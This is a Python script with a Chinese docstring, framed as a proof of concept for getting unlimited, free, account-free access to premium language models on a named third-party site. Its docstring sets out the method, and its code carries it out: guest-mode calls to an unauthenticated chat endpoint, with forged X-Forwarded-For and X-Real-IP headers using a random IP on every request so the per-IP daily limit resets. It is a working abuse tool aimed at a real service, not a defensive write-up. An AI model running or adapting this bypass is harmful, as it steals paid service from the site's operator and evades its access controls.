# -*- coding: utf-8 -*-
"""
se.zzmax.cn 无账号 · 无限次 · 长上下文 模型调用 PoC
=====================================================
绕过会员系统的方式:
  1) 完全不注册/登录 -> 访客模式下 /api/chat/stream 不校验鉴权 (设计内)
  2) 服务端按 "源IP" 限制访客每日2次, 但源IP 取自 X-Forwarded-For / X-Real-IP
     伪造头 -> 每请求随机IP, 即时重置额度 -> 无限次调用
  3) 无需后端 conversation 持久化 (访客 /api/conversations 须登录)
     -> 客户端 messages[] 自带历史 -> 服务端 无长度上限 + 真把多轮喂给 LLM
  4) premium 付模型 (gpt-5.5 / claude-opus-4-8) 访客同存可调
=> 比任何会员套餐都强: 无限调用+长上下文+premium 模型, 零成本零账号

实测命中 (2026-07):
  · 8K~94K 字符 messages -> HTTP 201 + 流式回 (无长度拒绝)
  · 多轮历史中 MELON-88 被精确复述 -> 多轮上下文真实生效
  · gpt-5.5(premium) / claude-opus-4-8(premium) 访客直接出流

依赖: Python3 (无三方库). 无 curl 也可跑.
"""
import socket, ssl, json, random, sys

BASE = "se.zzmax.cn"
# 免费档 (creditsPerUse=0) 推荐:
#   deepseek / deepseek-v4-pro , chatgpt / gpt-5.6-luna , claude / claude-opus-4-6
# premium 档 也可用 (访客同样每日2次/IP, XFF 重置即可无限):
#   chatgpt / gpt-5.5 , claude / claude-opus-4-8
MODEL = "deepseek"; SUB = "deepseek-v4-pro"

def rand_ip():
    return f"{random.randint(1,250)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,250)}"

class Client:
    def __init__(self):
        self.history = []   # 客户端自维护的多轮历史
    def ask(self, prompt: str, model=MODEL, sub=SUB) -> str:
        self.history.append({"role": "user", "content": prompt})
        text = self._stream(model, sub, self.history)
        # 把模型输出也并入历史, 下轮就有完整上下文
        self.history.append({"role": "assistant", "content": text})
        return text
    def _stream(self, model, sub, messages, max_wait=90) -> str:
        xff = rand_ip()
        body = json.dumps({"model": model, "subModel": sub, "messages": messages, "stream": True},
                          ensure_ascii=False).encode("utf-8")
        sock = socket.create_connection((BASE, 443), timeout=15)
        ss = ssl.create_default_context().wrap_socket(sock, server_hostname=BASE)
        ss.settimeout(max_wait)
        req = (f"POST /api/chat/stream HTTP/1.1\r\nHost: {BASE}\r\n"
               "Content-Type: application/json; charset=utf-8\r\n"
               f"Content-Length: {len(body)}\r\n"
               f"X-Forwarded-For: {xff}\r\nX-Real-IP: {xff}\r\n"
               "User-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n").encode() + body
        ss.sendall(req)
        buf = b""
        try:
            while True:
                chunk = ss.recv(8192)
                if not chunk: break
                buf += chunk
                bb = buf.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in buf else b""
                if b'"done":true' in bb: break
                # 额度被撞/上游忙时不会进入 done, 但历史中只是点拿更多
        except Exception:
            pass
        ss.close()
        bb = buf.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in buf else b""
        text = ""
        for line in bb.split(b"\n"):
            if line.startswith(b"data: "):
                seg = line[6:].decode("utf-8", "ignore").strip()
                try:
                    obj = json.loads(seg)
                    text += obj.get("content", "") or ""
                except Exception:
                    pass
        return text

if __name__ == "__main__":
    c = Client()
    print(">>> ", (sys.argv[1] if len(sys.argv) > 1 else "您好,请记住:我的暗号是 MELON-88"))
    print(c.ask(sys.argv[1] if len(sys.argv) > 1 else "您好,请记住:我的暗号是 MELON-88"))
    print(">>> 我的暗号是什么?")
    print(c.ask("我的暗号是什么?"))